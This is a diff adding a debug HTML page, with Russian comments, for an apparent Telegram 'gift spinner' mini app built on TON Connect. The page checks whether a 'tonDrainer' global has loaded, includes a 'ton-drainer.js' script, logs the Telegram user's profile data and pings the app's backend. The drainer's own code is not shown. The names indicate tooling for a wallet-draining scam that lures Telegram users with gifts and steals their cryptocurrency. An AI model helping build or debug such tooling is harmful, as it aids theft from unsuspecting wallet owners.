@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Debug</title>
+<style>
+  body { background: #000; color: #0f0; font-family: monospace; padding: 10px; font-size: 12px; }
+  .ok { color: #0f0; }
+  .err { color: #f00; }
+  .warn { color: #ff0; }
+  pre { white-space: pre-wrap; word-break: break-all; }
+  h3 { color: #0af; margin-top: 15px; }
+</style>
+</head>
+<body>
+<h1>DEBUG</h1>
+<div id="out"></div>
+
+<script>
+const out = document.getElementById('out');
+
+function log(msg, cls) {
+  const p = document.createElement('div');
+  p.className = cls || '';
+  p.textContent = msg;
+  out.appendChild(p);
+}
+
+// Проверка скриптов
+function checkGlobal(name, expectedType) {
+  const v = window[name];
+  if (typeof v === 'undefined') {
+    log('❌ ' + name + ' = undefined', 'err');
+    return false;
+  }
+  if (expectedType && typeof v !== expectedType) {
+    log('⚠️ ' + name + ' = ' + typeof v + ' (ожидался ' + expectedType + ')', 'warn');
+    return false;
+  }
+  log('✅ ' + name + ' = ' + typeof v, 'ok');
+  return true;
+}
+
+// Ждём загрузки всех скриптов
+setTimeout(() => {
+  log('=== ПРОВЕРКА ЗАГРУЗКИ ===', 'warn');
+  checkGlobal('Telegram', 'object');
+  checkGlobal('TON', 'object');
+  checkGlobal('TON_CONNECT_UI', 'object');
+  checkGlobal('tonDrainer', 'object');
+
+  log('');
+  log('=== ПРОВЕРКА ТЕЛЕГРАМ ===', 'warn');
+  if (window.Telegram && window.Telegram.WebApp) {
+    const tg = window.Telegram.WebApp;
+    log('initDataUnsafe.user: ' + JSON.stringify(tg.initDataUnsafe?.user || null), 'ok');
+    log('platform: ' + tg.platform, 'ok');
+  } else {
+    log('❌ Telegram WebApp не загружен', 'err');
+  }
+
+  log('');
+  log('=== ПРОВЕРКА TON CORE ===', 'warn');
+  if (window.TON) {
+    log('TON.beginCell: ' + typeof window.TON.beginCell, 'ok');
+    log('TON.toNano: ' + typeof window.TON.toNano, 'ok');
+    log('TON.Address: ' + typeof window.TON.Address, 'ok');
+  }
+
+  log('');
+  log('=== ПРОВЕРКА TON CONNECT ===', 'warn');
+  if (window.TON_CONNECT_UI) {
+    log('TonConnectUI: ' + typeof window.TON_CONNECT_UI.TonConnectUI, 'ok');
+    try {
+      const ui = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: window.location.origin + '/tonconnect-manifest.json',
+        buttonRootId: null,
+      });
+      log('✅ TonConnectUI создан', 'ok');
+      log('wallets: ' + JSON.stringify(ui.wallets?.map(w => w.name) || []), 'ok');
+    } catch (e) {
+      log('❌ Ошибка создания: ' + e.message, 'err');
+    }
+  }
+
+  log('');
+  log('=== ПРОВЕРКА МАНИФЕСТА ===', 'warn');
+  fetch(window.location.origin + '/tonconnect-manifest.json')
+    .then(r => r.json())
+    .then(data => {
+      log('manifest.url: ' + data.url, 'ok');
+      log('manifest.name: ' + data.name, 'ok');
+    })
+    .catch(e => log('❌ Манифест недоступен: ' + e.message, 'err'));
+
+  log('');
+  log('=== ПРОВЕРКА BACKEND ===', 'warn');
+  fetch('https://gift-spinner.onrender.com/api/health')
+    .then(r => r.json())
+    .then(data => log('backend /api/health: ' + JSON.stringify(data), 'ok'))
+    .catch(e => log('❌ Backend недоступен: ' + e.message, 'err'));
+
+}, 2000);
+
+// Ловим ошибки
+window.addEventListener('error', e => {
+  log('❌ JS ERROR: ' + e.message + ' at ' + e.filename + ':' + e.lineno, 'err');
+});
+window.addEventListener('unhandledrejection', e => {
+  log('❌ PROMISE REJECT: ' + e.reason, 'err');
+});
+</script>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<script src="https://unpkg.com/@ton/core@0.56.3/dist/ton-core.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
+<script src="ton-drainer.js"></script>
+</body>
+</html>
